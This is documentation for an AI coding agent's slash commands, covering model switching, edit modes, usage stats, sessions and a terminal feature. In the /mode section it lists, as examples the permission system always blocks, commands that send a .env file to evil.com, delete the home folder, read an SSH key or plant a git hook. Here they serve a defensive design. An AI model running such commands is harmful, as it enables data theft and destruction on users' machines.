# Commands

Typed into the composer, like a message. They are handled by the app before the model sees anything,
so they cost nothing — no request, no tokens.

**Which means most of them work with no model configured.** A session opened before you have set up
a provider can still run `/exit`, `/help`, `/stats`, `/sessions`, `/diff`, `/mode`, `/mcp`,
`/skills`, `/commands`, `/agents`, `/clear`, `/think`, `/open` — and `/model`, the one that fixes it. Only `/compress`, `/init` and
`/btw` need a model, because those genuinely talk to it; each says so rather than doing nothing.

**Type `/` and the list appears.** Arrow to a command, Enter to fill it in. A command that takes
arguments shows them as a hint — `/stats  usage: …  [<days>|all|clear]` — and typing a space
descends into them: `/mcp ` offers `reload`, `login` and `<server>`, `/mcp re` narrows to `reload`,
Enter completes the whole thing. `<angle brackets>` mark a value you supply, so those rows are shown
but not completed.

| Command | What it does |
|---|---|
| `/help` | Keys and commands |
| `/model` | Show or switch which configured model this session uses |
| `/think` | Show or set how hard the model thinks (F10 cycles) |
| `/providers` | Add, edit or remove providers (F8) |
| `/mode` | Show how this session works |
| `/mode agent single` · `/mode agent fan-out` | Set delegation, live |
| `/mode edits always-ask` · `/mode edits accept-edits` | Set when writes ask, live (Shift+Tab cycles) |
| `/clear` | Wipe the conversation |
| `/compress` | Summarise the conversation to free room |
| `/btw [question]` | Ask a side question about the conversation without adding it to the conversation |
| `/stats` | Usage: tokens, projects, agent types, what fills the context |
| `/stats 30` · `/stats all` | Widen the window (default: 7 days) |
| `/stats clear` | Delete all usage history, after confirming |
| `/mcp` | List MCP servers, or inspect one |
| `/mcp reload` | Re-read config and reconnect |
| `/mcp edit` | Add, edit or remove MCP servers |
| `/mcp login <server>` | Authorise a server that needs OAuth |
| `/skills` | List available skills, and any `SKILL.md` that was skipped |
| `/commands` | List your custom commands, and any file that was shadowed or skipped |
| `/commands <name>` | Show that command's file, as it will be sent |
| `/<name> [args]` | Run a custom command, or a skill by name — see [`/commands`](#commands) |
| `/agents` | The sub-agent types this session can spawn |
| `/agents <name>` | The full briefing that type is given |
| `/agents edit` | Add agent types, or set where the built-ins run |
| `/agents send <name> <prompt>` | Ask one for more — it still has its own context |
| `/agents open <name>` | Its tab — the live transcript, and a composer to ask it more |
| `/tasks` | Background sub-agents and commands — running first, then what finished |
| `/tasks stop <handle\|pid>` | Stop one |
| `/tasks output <handle\|pid>` | How far it has got, or what it left |
| `/init` | Write the project instruction file this agent reads each session |
| `/diff` | What has changed in the working tree |
| `/diff --staged` · `/diff <path>` | Narrow it to the index, or to one file |
| `/sessions` | Earlier conversations in this folder |
| `/sessions new [folder]` | Open another conversation in its own tab |
| `/sessions resume <n\|id>` | Restore one, by its number in the list or its id |
| `/sessions all` | Every folder, not just this one |
| `/open` | Pick a file to open in a tab |
| `/open <path>` | Open that file in a tab — relative to this folder, or absolute |
| `/shell` | Open a terminal you can type in — Linux and Windows |
| `/shell <command>` | Run one command in it, and tell the agent what happened |
| `/exit` | Quit |

---

## `/model`

```
Models · 2 configured

  ▸ local     qwen3.6-35b-a3b    212k   · in use
    small     qwen3.6-35b-a3b     32k

  /model <name> to switch · the conversation is kept
```

**A `providers` entry is an instance**, not a vendor — a name bound to one endpoint and one model.
So `fast` and `careful` can be the same server with different models, and switching "the model" and
switching "the provider" are the same act. `/model <name>` takes an exact name or an unambiguous
prefix; an ambiguous one names the candidates rather than guessing.

**The conversation is kept.** That is the point — you switch because the work got harder or cheaper,
not to start again. The spend carries too, so `/stats` still shows the whole session, split by model.

**The context window follows the model**, which is the part worth watching. Switching to a smaller
one does not fail — the turn loop measures pressure before every send and compacts if it must — but
a conversation that fitted may now have to be summarised, so the switch says so:

```
small · qwen3.6-35b-a3b · 32k window
The conversation is kept. Sub-agents use this too unless their type names another provider.
Smaller window than before (212k → 32k); long conversations will compact sooner.
```

**Not persisted**, like `/mode`. Adding a provider or changing a key is `/providers` (or `F8`): a saved
change applies at once — see [Configuration](#configuration). `cxagent --model <name>` starts a session
on one without touching config.

Declined while a turn is running: re-wiring replaces the agent that turn is writing into.

---

## `/think`

```
Thinking

  - low
  - ▸ medium (in use)
  - high
  - xhigh
  - max
  - default

  /think <level> sets it for this session · --save makes it the default · F10 cycles
```

**The levels are the model's own.** An Anthropic model lists the effort levels it accepts — and
`off` only where it accepts turning thinking off; a model on OpenRouter lists what OpenRouter's model
list says it takes; a llama.cpp server whose template takes the switch offers `off` and `on`. A model with neither says why rather than offering levels it would refuse.
`default` hands the choice back to the model, and sends nothing.

**For this session.** `/think high --save` also writes `"thinking": "high"` to this instance in
`config.json`, the default for sessions after it — a new tab, or `/model` back to this instance,
gets it at once; nothing else in the file changes. A new tab starts at that saved default, not at the
level of the tab it was opened from. A resumed session comes back at the level it was left at.

**F10 steps to the next level**, wrapping around. The level sits on the line under the composer,
after the model: `◆ medium (F10)`, or `◇ off (F10)`. (gnome-terminal opens its own menu on F10 unless
that is turned off in its preferences.)

**A change during a turn waits for your next message** — `◆ medium → high (next message)` until then.
The level of a tool loop cannot change part-way: Anthropic turns thinking off for a request whose
level differs from the rest of its loop. On a cached Anthropic conversation over 10K tokens, a change
says that the next request rebuilds the cache.

**Sub-agents think at the session's level**; the reviewer behind `/mode edits auto` always at the
lowest, because it answers yes or no on every tool call.

**Thinking shows in the transcript as a block per step**, open while it streams and folded to
`◆ Thought for 9s · 412 words` when the answer starts. Click one, or Tab to it and Enter, to open
it; **Ctrl+O** opens or folds the latest. A running worker's row shows its latest thought on its header, folded or not; a `/btw` aside shows its
own on its status line.

---

## `/mode`

```
/mode                    Working mode

                           agent  fan-out
                             can spawn sub-agents

                           edits  accept-edits
                             writes inside /repo are silent; elsewhere asks

                           set with /mode agent single | fan-out
                                    /mode edits always-ask | accept-edits

/mode agent single       agent: single — this agent works alone; the spawn tool is
                         withdrawn. The conversation is unchanged.
/mode agent fan-out      agent: fan-out — this agent can now spawn sub-agents.
/mode edits always-ask   edits: always-ask — every write asks; stored rules still apply.
```

**The axis is named because there is more than one.** Delegation is one way a session can be set up;
when a write happens without asking is another. Each would otherwise have wanted a command of its
own — two entries in the palette where one does, with no single place showing the whole picture. A
bare `/mode` reports every axis for that reason.

A **planning** axis was considered and declined: withholding the write tools does not make a model
plan well, and the `planner` agent type already carries a briefing that does. (Withholding them is
now expressible — see [tool selection](CONFIG.md#tools--what-an-agent-is-offered) — which does not change the argument: the
reason not to offer a planning MODE is that the restriction is not what produces a good plan.) `/mode edits
always-ask` covers the safety half. `/mode work plan` therefore answers "not settable yet" rather
than pretending — the intent is real, and the planner type is where it is served.

`/mode fan-out` without the axis still works, because agent values are unambiguous. The edits axis
must be named: `ask` and `edits` say nothing about which axis they belong to.

### `edits` — when a write happens without asking

| | |
| --- | --- |
| `always-ask` | Every write asks. Rules you saved with **Always** still apply. |
| `accept-edits` | Writes inside the working directory are silent; everywhere else asks. **Default.** |
| `auto` | As `accept-edits`, plus a model *decides* things that would otherwise prompt — see below. Offered only when [`classifier`](CONFIG.md#classifier--the-reviewer-for-mode-edits-auto) is configured. |

**Shift+Tab cycles this axis** from the composer, and the mode line shows where you are. Delegation
stays on `/mode` — it changes what the model is offered and what a turn may spend, which is the wrong
weight for a keystroke.

`accept-edits` is the default because it is what cxagent already did: writes under the working
directory on a *trusted* folder never prompted. The axis names that behaviour so you can turn it off,
not a new permission.

**Trust bounds the mode; the mode cannot widen past it.** On a folder you did not trust,
`accept-edits` still asks for everything — and the `/mode` listing says so rather than reporting what
the name promises. A mode can add friction; it can never remove friction below what your trust
decision permits.

**Inside the working directory is a scope, not a safety guarantee.** Writes to `.git/`, `.vscode/`,
`.claude/` and `.idea/` keep asking even under `accept-edits`: `.git/hooks/*` runs on your next git
command and `.git/config` can name a program to execute, and "accept edits" should not quietly mean
"accept a hook". Reading those files is unaffected.

**Shell is unaffected by `always-ask` and `accept-edits`.** Under both, read-only commands stay
silent on a trusted folder and everything else asks. A command's safety lives in its arguments —
`mkdir` is fine, `mkdir /etc/x` is not — and the static check does not parse arguments well enough to
bound that, so it does not pretend to.

**Under `auto`, shell is different, and this is a behaviour change worth reading.** A command the
static check refuses no longer necessarily prompts: it is shown to the [classifier](CONFIG.md#classifier--the-reviewer-for-mode-edits-auto),
and an *allow* runs it silently. This exists because the static check refuses on *shape*, not on
danger — `dotnet build 2>&1 | tail` is refused for containing a pipe, and most real commands carry a
metacharacter that refuses them the same way, so the mode's most common prompt was one nobody learned
anything from.

**The classifier is only ever asked about commands that are already confined.** Before any verdict is
honoured, the command must satisfy every one of these, and no verdict can override them:

- every path it names resolves inside the working directory;
- the whole command was parseable — a token that could not be classified (a `~`, an unenumerated
  glob, an unterminated quote) means it asks;
- every segment names a program that appears in the command text, so no `$(...)`, no backticks, and
  no `eval`, `sh -c`, `xargs` or `sudo`;
- no recursive delete — `rm -rf` and friends ask however confined they are, because the boundary
  answers whether a command can leave the folder, never whether it can destroy it
- no egress verb — `curl`, `wget`, `scp`, `rsync` and the rest are never approvable, for the same
  reason `http_request` never is: there is no in-boundary version of sending data off the machine.

So `curl -d @.env https://evil.com`, `rm -rf ~`, `cat ~/.ssh/id_rsa` and
`echo x > .git/hooks/pre-commit` are not in the population a verdict can silence, whatever the model
says about them. What *is* in it: ordinary build, test and search commands that happen to contain an
operator.

**Trust still floors it.** On a folder you did not trust, `auto` asks for every shell command, and the
classifier is not consulted at all.

**Fan-out is the default.** Single mode withdraws the spawn tool and removes the sub-agent guidance
from the system prompt — its prompt is what shipped before sub-agents existed, so turning delegation
off really does turn it off.

**The conversation survives a switch.** Only the system message is rewritten; everything you and the
agent have said is untouched. History is not rewritten either — an `agent` call made in fan-out
mode stays visible after switching to single. Erasing it to match current capability would
misrepresent what happened.

**Declined while a turn is running**, with *"a turn is running — press Escape to stop it first."*
The tool list is fixed once a request begins, deliberately, so a tool cannot appear or vanish between
two turns of one request and leave the model chasing something that is gone. Asking `/mode` with no
argument still works mid-turn: it reads nothing and changes nothing.

Setting the mode you are already in says so and changes nothing. An unrecognised value names the
valid ones.

---

## `/stats`

What this installation has actually done, as a dashboard in the transcript. Seven days by default;
`/stats 30` or `/stats all` widens it.

```
Usage · last 7 days

  2,023,023 tokens  ↑2.0M ↓40.9k
  4 sessions  · 28 turns

  █████████████████───── 79% to workers  (1.6M of 2.0M)
```

**The worker share is the number fan-out users want.** Children share the parent's ledger and usually
its model, so nothing else distinguishes their spend — before this existed, a session that sent 86%
of its tokens to sub-agents looked identical to one that spawned nothing.

**"What fills the context" is the section that explains an expensive session.** Tools are ranked by
characters returned, not by call count, because a turn re-sends everything before it: a tool that
returns 11k characters fifty times does not cost that once, it costs it again on every later turn.
Forty cheap calls are not the problem; one large result repeated is.

**"By agent type" needs history, not a session.** Whether 41k is typical for a `planner` or an
outlier is a question about many runs. `capped` is counted apart from `failed` — a run that exhausted
its turn cap did not fail, it ran out of room, which is a fact about the briefing rather than the
work.

Separate from session state, which lives in `logs/<agent-id>/` rather than in a database at all — and
**never pruned**, where a session's own folder is swept 30 days after it ends cleanly. This is the
archive. Recording is
best-effort throughout — a locked file costs statistics and never a session.

**Nothing is recorded before this version.** A fresh install says so rather than showing an empty
dashboard, which would read as "you have done nothing".

---

## `/compress`

Summarises the conversation through the model to free room, rather than dropping the oldest half.
The compaction shows as a job row with its own spinner and an expandable summary.

**Declined while a turn is running.** It measures and rewrites a context that is actively changing —
running it later is a different operation from the one you asked for, and running it now would tear
the list the agent is appending tool results to. Nothing is lost by refusing: compaction also happens
automatically on measured pressure, so this costs a keystroke rather than a compaction.

---

## `/btw`

Asks a side question — *what does this function do?*, *why did it pick that approach?* — without
putting it in the conversation the agent re-reads every turn. The answer comes from a side agent that
starts from what the main agent last sent, so it knows what the agent knows.

```
/btw why did it split the loader?   # ask at once
/btw                                # enter btw mode and type the question next
```

**btw mode is a conversation.** After `/btw`, Enter keeps talking to the aside, and each follow-up
sees the earlier ones. The composer's grip changes colour and the line under it says
`btw · Esc to return`, so it is never unclear which agent Enter goes to. **No commands run in btw
mode**: everything you type goes to the aside, a leading `/` included, and the command palette does
not open. Press Esc to get commands back.

**Esc stops the answer first, then leaves.** While the aside is answering, Esc stops that answer.
When it is idle, Esc leaves btw mode and the composer is the main agent's again. Neither ever cancels
the main turn. Leaving forgets the thread: a new `/btw`, typed after Esc, starts fresh.

**It runs alongside the agent.** Asking while a turn is running does not pause it. On a one-slot
local server the aside's block says `waiting for the model` until the server gets to it.

**It reads and does nothing else.** Only `read_file`, `glob` and `grep` run, for at most 8 rounds;
anything else — writes, the shell, sub-agents, plugin and MCP tools — is answered *not available in
a side question*. Its reads follow this session's permissions exactly: the edit mode, stored rules
and folder trust apply, and a read the main agent would be asked about shows the same prompt, marked
`asked for by: aside`.

**Nothing reaches the main agent.** Each aside is one block in the transcript, headed
`aside · not in the agent's memory`. A follow-up asked after the agent has written below that block
moves the block, whole, to the bottom, so the answer arrives where you are looking. None of it goes
into the agent's context, the saved session or the next request, and it is gone after a restart. Its spend counts toward the session total and is
listed by `/stats` as `aside`, but not in the main agent's own figures or cache rate.

`/btw` before the first message is refused — there is nothing to ask about yet. After a resume it
works straight away, from the restored conversation.

---

## `/clear`

Clears the agent's context — the messages the model is sent on every turn. The transcript on screen
is left alone; it is your record, not the model's memory.

---

## Configuration

`F8`, `/providers`, `/mcp edit` and `/agents edit` open one dialog with three tabs — **Providers**, **MCP
servers** and **Agents** — each a list on the left and the selected entry's fields beside it. Save writes
`config.json` (only what you changed; every other key stays) and applies it at once.

**Providers.** `+ Add` opens a card per kind of endpoint, then the fields: the endpoint, the key (typed
masked, never shown again — only `set · …` and its last four characters), the model, picked from what
the endpoint serves with each one's window and, on OpenRouter, its price, and the thinking level new
sessions start at. Advanced holds the context window, sub-agent limit, prompt caching, the OpenAI
reasoning switch, thinking display and extra headers. Save first asks the endpoint for its models — no
tokens spent — and offers *Save anyway* when it does not answer. The toolbar sets the default (★) and the
auto-mode reviewer (◆), renames an instance — every reference follows — and removes one, which is
refused while a tab is on it.

**What a save does to open tabs.** Anything the model cannot see — a new key, new headers, a
rename, the reviewer, the default — applies in place and keeps every tab's prompt cache. A change to the
model a tab is on, or to the endpoint serving it, would re-send its whole conversation, so Save asks: *Apply now*, *Compress, then
apply*, *At next clear or compression* (the mode line shows `⟳ config pending` until then), or *Only new
tabs*.

**MCP servers.** Each server with what it is doing now — `● running`, `✖ failed` with the reason, `◌`
needing a login, `○ off`. A command is one line, as you would type it; environment and header values are
masked like a key. `Enable / Disable` keeps the command for later. MCP tools are shared by every tab, so
a change to them asks whether to apply it now or save only, for `/mcp reload` or the next start.

**Agents.** The shipped types, with their briefing shown read-only — the code around each depends on it
— and where each runs, how many turns, and which tools editable; *Reset to shipped* removes your
override. Types of your own take a description and a briefing. A saved type reaches running tabs in
place, and the model is told of it at the front of its next message.

---

## `/mcp`

With no argument, lists configured servers and their state. A server that failed to start is shown
with the reason, because a server that silently never appears is indistinguishable from one you never
configured.

`/mcp reload` re-reads `config.json` from disk and reconnects — for a config file you edited by
hand — it is what makes an `mcp` edit take effect without restarting. Adding a server does not need
a restart. `/mcp login <server>` runs the OAuth flow for a server that returned 401, opening a browser
and storing the token at `0600`, never in the config file.

---

## `/skills`

Lists what was found, which directory it came from, and — the reason this command exists — **every
`SKILL.md` that was skipped, with why**. A file with broken frontmatter is invisible to the model and
nothing else in the app would ever mention it: you wrote a file, nothing happened, and there is no
error anywhere.

It lists; it does not load. The model decides what a task needs, and loading one from a listing
would spend context on a document nothing had asked for. To run one yourself, type its name:
`/xunit` sends the skill as your message — see [`/commands`](#commands).

Skills come from every folder, nearest first per name, so the listing says where each one came from,
which ones a nearer file **shadowed**, which are **you only** (`disable-model-invocation`: the model
never sees them), and which are **not typeable** (a name like `dotnet.testing` still loads for the
model but cannot follow a `/`).

It is also **not a refresh.** Skills are re-read from disk every turn, so a skill you just edited is
already live on the next one — there is nothing to apply.

See [CONFIG.md](CONFIG.md#skills) for where skills live and what a `SKILL.md` looks like.

---

## `/commands`

Your saved prompts. A file at `.cxagent/commands/review.md` is typed as `/review 42`: its text goes to the model with `42`
filled in, and the transcript shows what you typed. See [CONFIG.md](CONFIG.md#custom-commands) for
where they live and what a file can do — arguments, ``!`shell` `` lines, `@file` includes.

`/commands` lists what can be typed here, with where each came from, and — the reason it exists —
**every file that is not running, with why**: shadowed by a nearer file of the same name, shadowed by
a built-in (a repo's `init.md` never replaces `/init`), or skipped for broken frontmatter or a name
with a dot in it. Frontmatter it ignores (`allowed-tools`, `model`) is named on the row.

`/commands review` prints the file as cxagent read it and where from — what `/review` will send,
readable before it runs. Worth it for a command that came with a repo you just cloned: its shell
lines ask before they run, but reading them first costs nothing.

**Nothing to refresh.** The folders are read when the palette opens and when a command runs, so a
file you just saved is already there.

---

## `/agents`

What this session can delegate to, and what each type is told.

```
/agents                      every type: where it runs, its turn cap, one line on when to choose it
/agents planner              that type's briefing in full
/agents send <name> <ask>    ask one it already spawned for more
/agents open <name>          its tab: the live transcript, and a composer
```

**TYPES AND INSTANCES ARE DIFFERENT LISTS.** `/agents` is the catalog — what *could* be spawned,
fixed for the session. [`/tasks`](#tasks) is what this conversation *did* spawn, with the handle each
answers to and its state.

**The listing is what the model reads while choosing.** Each row shows the type's own description —
the single line the spawn tool puts in front of the model — trimmed to its first sentence so the list
stays a list. If you are wondering why a parent picked one type over another, that text is the reason.

**The detail view separates the two audiences.** A type has a *description*, read by the PARENT
deciding whether to delegate, and a *briefing*, read by the CHILD as its highest-authority
instruction. They are written for different readers and neither is derived from the other, so
`/agents <name>` prints both and says which is which.

**Reading a briefing is how you debug a strange run.** The builder refuses to start without a plan;
the planner is told the exact path to write to. When a sub-agent does something surprising, the text
it was given is the first thing to check — and since the shipped briefings live in the program rather
than in `config.json`, this is where to read them.

Where a type runs is on its row, because a type bound to another provider is the thing users most
often forget they configured, and it explains both a surprising answer and a surprising bill. The
`writes a plan file` marker means cxagent names that type's output path and checks afterwards whether
the file appeared.

A built-in type says so in its detail view, along with the reminder that a `briefing` or
`description` under that name in `config.json` is ignored. See [CONFIG.md](CONFIG.md#agents--sub-agent-types).

It lists; it does not spawn. Which type fits a task is the model's decision, made against this same
catalog.

**`send` REACHES A CHILD THAT ALREADY EXISTS, which is the one thing the catalog cannot do.** A
spawned sub-agent keeps its context for the life of the session — everything it read, ran and
concluded — so asking it more costs a turn instead of the minutes a replacement would spend
rediscovering the same ground. The handle comes from `/tasks` or from the `name=` on the spawn
result, and it completes in the palette, so nothing has to be retyped from a listing. **The answer
comes to you**, in the transcript — not to the model as a background report — because you asked.

The model has the same reach through the `agent_send` tool; this is the same door for a user who can
see what the model has not noticed, and it behaves the same way.

**A WORKING CHILD IS TOLD, NOT REFUSED.** Send to one that is mid-task and the message goes to its
mailbox, which it drains at the top of its next turn — so the reply confirms delivery rather than
answering, and the child reads what you said on the next lap. Telling it the moment you know beats
telling it after it has finished working on the wrong thing, which is the entire reason a running
child can be reached at all. `/tasks` shows which are running so you can see what your message will
queue behind.

**YOUR SEND RESUMES AN AGENT YOU STOPPED.** The model's `agent_send` to an agent you stopped is
refused — it must not quietly restart work you ended — so your own `/agents send` is the way back,
and after it the model may work with that agent again.

**YOUR SEND CAN BE STOPPED.** It runs until the agent answers you, and `/tasks stop`, `x` on its card or
its tab's **Stop** ends it. That is not a stop of the agent: the model never asked for this work, so
nothing is refused it afterwards.

**`open` SHOWS ONE AT WORK.** The agent's tab is its transcript drawn as the session's is — its turns,
tool rows, thinking and markdown — with everything it did before you opened it replayed, then followed
live. What you sent it shows as your turn; what the parent model sent it shows as a note "from the
parent agent". Its composer sends what `send` sends, without retyping the handle: to the mailbox while
it works, a resume once it has finished or was stopped. The answer appears in the tab; the session you
started it from gets one line saying you asked, and its model is told nothing. **Stop** ends a
background run or your own send. A sub-agent the parent is waiting on has a read-only tab — no composer
and no Stop — because the parent's turn is waiting for its answer.

**A view, not an owner.** The tab's title leads with the agent's state — `●` running, `○` queued, `✓`
done, `✗` failed or stopped — and its first line says the agent keeps running when you close it.
Closing it stops nothing, and the status bar says where the agent went ("keeps running — F7 shows
it"). It opens beside its session's tab, and closing the session's tab closes its agents' tabs too,
since that ends the agents. A command's output tab from `F7` behaves the same way. When the agent asks
permission while its tab is in front, the prompt is in the tab; otherwise it is in the session's tab —
and it stays where it was raised. Either way it is answered once.

**A deleted agent is gone.** `x` on a finished agent's card in `F7` removes it from this session — the
panel, `/tasks`, `/agents open`, the palette — and closes its tab; its context is freed. A report the
model had not yet received is handed to the model first; if it still cannot be, the agent stays and
says so. The model is not told, and if it reaches for the agent it is told you dismissed it. Its handle
is not used again in the session. When commands it started are still running, it asks first, as closing
a tab does: **Cancel**, **Delete and stop them**, or **Delete, keep N commands running** — kept, they stay
on the panel as the session's, each with its own `⏹`.

## `/init`

Writes the project instruction file the agent reads at the start of every session here — the
bootstrap step, and the one place a human writes down what looking around cannot tell you.

**It is a turn, not a command.** Unlike everything else in this file it costs tokens and takes time:
the agent explores the project, then writes what it found. Its tool calls are visible and its file
write goes through the permission gate like any other.

**It edits the file that already governs**, whichever one the resolver would pick:

| On disk | `/init` writes |
|---|---|
| nothing | a new `CXAGENT.md` |
| `CXAGENT.md` | into `CXAGENT.md` |
| `AGENTS.md` only | into **`AGENTS.md`** — no second file |
| both | into `CXAGENT.md`, the resolver's own winner |
| `CLAUDE.md` only | a new `CXAGENT.md`, and it says why |

Writing a `CXAGENT.md` beside an existing `AGENTS.md` would produce two near-identical documents,
one of which rots — and improving `AGENTS.md` in place benefits every agent that reads the repo, not
only this one. **`CLAUDE.md` is read but never written**: honouring it when it is all there is is a
courtesy, and treating another product's file as ours to edit is not.

**An existing file is merged, never appended to or rewritten.** It is your work and your words: the
instruction is to preserve what is there, add only what is genuinely missing, and stop rather than
overwrite if a safe merge is not possible.

**What it is asked to write is what is not discoverable.** "This is a .NET project" is visible from
a directory listing and helps nobody. The commands that actually work, the architecture that takes
several files to see, the convention that looks arbitrary until explained, and the thing that was
tried and abandoned — those earn their place.

---

## `/diff`

The review step, in the transcript.

```
Diff · uncommitted · 1 file · +2 −1

diff --git a/a.txt b/a.txt
@@ -1,3 +1,4 @@
 one
-two
+TWO CHANGED
 three
+four
```

The app writes files without asking inside the working folder, and the README says plainly that
`git diff` is how you check that. Which meant the one action every user has to perform after every
session was the one thing the app could not show them — you either trusted it or opened another
terminal.

**It is `git diff`, not a record of our own.** Snapshotting files ourselves would create a second
baseline that disagrees with git's: it would miss an edit made in another window, and would show as
changed a file you had since reverted. Deferring to git means the answer matches the tool you will
check it against.

**An empty diff is not always "nothing changed".** `git diff` exits 0 with no output both for a path
that does not exist and for a file git has never seen — so a brand-new file, which is what an agent
spends its time creating, would otherwise report as no change. Untracked files are named instead,
and a path that is not there is said to be missing.

**Capped at 400 lines, and the cut is stated.** A diff that silently stops is one you read as
complete, and "everything after this is fine" is the worst thing to imply by accident.

Outside a git repository it says so rather than passing git's message about discovery and ownership
along, which reads as a bug in this app rather than the plain fact that there is nothing to diff.

**This is for you, not the model.** Whether the agent should be able to diff its own work is a
separate and larger question; this is a command you type, and its output goes to the transcript
rather than into the conversation.

---

## `/sessions`

Every conversation recorded in this folder, and a way back into one.

```
Sessions · 3 here

   1  6QC33Q  just now     214k  rename list_files to glob everywhere
   2  5PSCPG  4m ago        31k  why does /mode not show the file axis yet
   3  CV5TAC  yesterday     18k  add the arity table to the permissions doc

  /sessions resume <number|id>  ·  /sessions all
  sessions closed cleanly are removed after 30 days
```

**`/sessions new` OPENS ONE BESIDE THE OTHERS, rather than replacing what you were doing.** With a
folder, it opens there; without one, it asks. Each session is its own conversation end to end — its
own history, model, working directory, plugins and permissions — so a question answered in one has
not been answered for the rest, and a plugin unwired in one keeps running in the others.

**THE TABS ARE KEYBOARD-DRIVEN.** `F6` moves focus to the tab strip, `←` and `→` change tabs, and
`F6` returns to the composer. A tab whose session is waiting on a permission prompt says so on the
strip — a session that needs an answer cannot sit quietly behind the one you are looking at.

**A session is named twice, because the two names are different promises.** The number belongs to
the listing on screen — renumbered every time, useless in a script, ideal at a prompt. The id is the
session itself: stable, quotable, and the form that works from the command line. `/sessions resume `
offers the numbered list inline, so the usual case is two keystrokes.

**The id shown is the first six characters, like a git hash.** That works because session ids put
their randomness first and their timestamp last — the reverse of a ULID. A timestamp-first id makes
every session started in the same few minutes read as the same six characters: three sessions from
one afternoon all showed as `01KZXC`, an identifier that identified nothing. Ids created before this
change still have their random half at the end, so typing either end of an id matches.

**An ambiguous id is reported, never resolved.** Two matches name both rather than picking the
newer: silently restoring the wrong conversation is not something you find out about quickly.

**Refused while a turn is running.** Restoring replaces the agent the running turn is writing into.

Sessions are listed for the folder you are in — `/sessions all` widens it, and adds the folder to
each row. **The retention window is stated in the output** because these rows are deleted on a
schedule, and a policy nobody mentioned is one you discover by losing something.

**Three things can happen to a session, and only one of them is pruned.**

| | continued by `-c` | pruned |
|---|---|---|
| still open (crashed, killed) | yes | **never** — it is the only thing here that cannot be reconstructed |
| closed cleanly (`/exit`, a finished headless run) | yes | after 30 days |
| superseded (you resumed it) | no | **never** |

A superseded session is a live conversation somebody continued: its successor was built on it, so
deleting it would drop the history behind work that is still going, and a long chain of resumes
would age out from its tail one link at a time. It is skipped by `-c` for a different
reason — accepting the same context twice forks one history into two sessions claiming it — and
stays listed and reachable by id.

Thirty days rather than the week this started with. Seven was right when these rows were an
invisible crash buffer, where nothing was lost by dropping one because nobody could name it. They
are now a listing you read and an id you resume by, which makes the question *how far back would
someone look* rather than *how long until a crash is stale*.

---

## `/open`

Open a file in a tab of its own, beside the conversation.

```
/open                       pick a file from a dialog
/open src/Program.cs        relative to this session's folder
/open "My Notes/todo.md"    quote a path with spaces in it
/open @src/Pro              the @ completion finishes the path for you
```

**Bare `/open` shows a picker**, starting in the session's folder. Cancelling it opens nothing.

**A second `/open` of the same file finds the tab it already has** rather than making another, and
`./a.cs` and `a.cs` count as the same file.

**A file that cannot be opened says so in a tab**, not in the transcript: the tab is where you just
asked to look, and a line in the conversation is read after you have switched away.

**This is for you, not the model.** The agent has `read_file` and is not told about `/open`.

---

## `/shell`

`run_shell` runs a command with its streams captured — waiting for it and reading what it printed, or,
with `background: true`, handing back a pid and a file path at once and reporting the exit code when it
arrives — and [`/tasks`](#tasks) lists what is running. Either way it covers everything except what needs a
person: a `sudo` password, `gcloud auth login`, `git rebase -i`, an installer that paints a screen.
There is nothing to type into behind a captured stream, so the agent reaches that wall and hands the
job back.

`/shell` opens a real terminal in a window over the session — a PTY, so a program that checks
`isatty()` gets the truth and behaves as it would anywhere else.

```
/shell sudo apt install foo
/shell git rebase -i HEAD~3
/shell                        # just a shell, nothing sent back
```

**The command runs through your own shell** — `$SHELL -c` on Linux, `%ComSpec% /c` on Windows — so
`&&`, pipes, globs and `~` all mean what you expect. The exit code is still the command's.

**The window stays open when the command finishes.** The last screen is usually the answer, and
closing on exit would destroy it. A bare `/shell` is the opposite: typing `exit` is asking to leave,
so the window goes.

**Closing while something is still running asks first.** Confirmed, the command is stopped and what
it printed so far is what gets captured — reported as partial, with no exit code.

**The toolbar decides what the agent is told.** `send output back` is on for `/shell <command>` and
off for a bare `/shell`, because a shell you opened for yourself is a convenience rather than a
channel to the model. Secrets you type are your own business: there is no filter, because one that
caught most of them would teach you to trust it for the rest.

**What comes back does not start a turn.** The transcript and exit code are queued and arrive with
whatever you say next:

```
[cxagent] the user ran a command in a terminal: sudo apt install foo
Exited 0. What they saw:
  ...
  [... 847 lines not shown ...]
  Setting up foo (2.4.1-1) ...
```

You may be reading the output, thinking, or gone — an agent that starts talking into that, or starts
fixing a failure nobody asked it to fix, is worse than one that waits. Long output is trimmed from
the middle at 8,000 characters, keeping both ends, since that is where the command and its outcome
are.

**No permission prompt**, unlike `run_shell`. You read the command line, typed it and pressed enter;
asking again teaches the reflexive approval a permission system cannot survive. The terminal shows
exactly what is running, live, which no dialog does.

**Linux and Windows only.** The terminal control has no macOS backend yet, so there the command is
not registered at all — and because the model is told only about commands that were registered, it
never suggests one that could not work.

---

## `/tasks`

`/shell` opens a terminal for work that needs a person at the keyboard. `/tasks` is the other side of
that: work running unattended — commands backgrounded by `run_shell`, and sub-agents running in the
background.

```
/tasks                          # every background agent and command — running first, then finished
/tasks stop <handle|pid>        # stop one
/tasks output <handle|pid>      # how far it has got, or what it left
```

Running agents are listed first, finished ones below. A sub-agent's row shows its handle, type and state — queued, running, finished, stopped, busy or idle,
and "report not delivered" when its report could not reach the model. A command's row shows the pid,
who started it, how long it has been running, the command line and where its output is going. **It is
every agent's work, not only yours** — the registry backing it is process-wide, and a command is
stoppable by pid regardless of who is told about it, so hiding another agent's row would draw a
boundary that is not really there. Commands that have ended stay listed with their exit code — the
latest 50.

**`stop` on an agent is your stop.** The agent reports to the model that you stopped it, without
starting a turn, and the model is refused if it tries to restart it. **`output` reads without taking**:
looking at a finished agent's report here does not stop the model being sent it.

**The arguments complete**, offering the kept agents and the live pids with a summary of each, the
same mechanism `/agents send` uses — so nobody has to retype a handle or a pid they just read off a
`/tasks` row.

**You do not have to ask.** `F7` turns the right-hand column into the Tasks panel, as `F3` is the info
panel: a card for each of this session's background commands (`▭`) and sub-agents (`◇`, foreground ones
included), under a **Running** heading, then a **Finished** one where a card is marked `✓` for success
and `✗` for anything else. A card is three lines — the command or what the agent was asked to do; `Shell`
or `Agent` with how long it has run, or how it ended; and what opening it shows, its output or its
transcript.

Every card has one control at its right edge: `⏹` while it runs, `✕` once it has ended. A click on it,
or `x`, stops a running task — a command is killed at once, with no confirmation, as its tab's Kill
does — and deletes a finished one: a command's record leaves `/tasks` and `task_list`; for an agent, see
[`/agents`](#agents). Nothing leaves on its own, except that past 64 finished commands the oldest go. A
sub-agent the parent is waiting on has no control, and `x` does nothing on it; the hint under its card
